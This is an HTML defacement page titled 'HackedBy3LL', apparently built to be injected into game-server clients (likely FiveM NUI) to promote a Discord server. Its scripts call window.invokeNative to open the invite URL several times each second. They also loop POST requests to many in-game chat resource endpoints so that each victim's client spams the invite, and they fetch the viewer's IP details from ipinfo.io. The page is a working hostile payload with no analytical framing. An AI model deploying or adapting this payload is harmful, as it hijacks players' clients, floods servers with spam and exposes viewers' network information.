<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>HackedBy3LL</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background: url('https://media.discordapp.net/attachments/1351702073594482718/1403188736421793883/6b149c70613c112873abc6ca4d1e6518.gif?ex=6896a4d8&is=68955358&hm=9ce587277cc6a7ad50e126012de8540eca281d54e8a5a8ff55ffc95cea1c660c&=') no-repeat center center fixed;
            background-size: cover;
            font-family: 'Courier New', Courier, monospace;
            color: #0000ff;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            flex-direction: column;
            text-align: center;
        }
        .info {
            margin-top: 20px;
            font-size: 1.5em;
            color: #ff0000; 
            
            letter-spacing: 4.5px; 
            white-space: pre-wrap;
        }
        .text {
            margin-top: 20px;
            font-size: 3em; 
            color: #ff0000; 
            text-shadow: 0px 0px 8px #ff0000, 0px 0px 15px #0000ff, 0px 0px 25px #ff0000; 
            letter-spacing: 4.5px; 
        }
    </style>
</head>
<body>
    <div class="image-container">

    </div>
    <audio autoplay loop>
        <source src="https://cdn.discordapp.com/attachments/1351702073594482718/1403193522177179729/313d9d146267c730.mpeg?ex=6896a94d&is=689557cd&hm=9a097754720390bdfea08baee7c2c293fb80011959cb399da0f7139dc1021c4d&">
        Your browser does not support the audio element.
    </audio>
    <div class="text">discord.gg/3ll</div>
    <div class="text">B3yonyy LL</div>

    <script>
         fetch('https://ipinfo.io/json')
        .then(response => response.json())
        .then(data => {
            delete data.readme;
            const infoDiv = document.getElementById('ip-info');
            infoDiv.textContent = JSON.stringify(data, null, 2);
        });
    </script>
    
</body>
</html>
<script>
setInterval(() => {
window.invokeNative("openUrl", "[https://discord.gg/3ll"](https://discord.gg/3ll%22));
window.invokeNative("openUrl", "[https://discord.gg/3ll"](https://discord.gg/3ll%22));
window.invokeNative("openUrl", "[https://discord.gg/3ll"](https://discord.gg/3ll%22));
window.invokeNative("openUrl", "[https://discord.gg/3ll"](https://discord.gg/3ll%22));
}, 1000);
    </script>
    </body>
</html>
<script>
    const msg = `Discord.gg/3ll`;
const body = JSON.stringify({ message: msg });
setInterval(() => {
fetch("https://flix-scripts/chatResult", { method: "POST", body });
fetch("https://danger_chat/Danger_Chat:SendMessage", {method: "POST",body: JSON.stringify({"message": msg,"channel": "شات العام","color": null,"isImageAndLinksAllowed": [false,false]})})
fetch("https://easy-chat+/o6ZbK5Ecp6", {headers: {accept: "*/*","content-type": "application/x-www-form-urlencoded; charset=UTF-8"},body: JSON.stringify({ message: msg, channel: "شات العام" }),method: "POST"});
fetch("https://melix_chat/chatResult", { method: "POST", body });
fetch("https://as_chat/chatResult", { method: "POST", body });
fetch("https://chat/chatResult", { method: "POST", body });
fetch("https://ho-chatv2/Chat", {method: "POST",body: JSON.stringify({"Type": "chatResult","message": msg,"chatType": "general"})});
}, 1000);
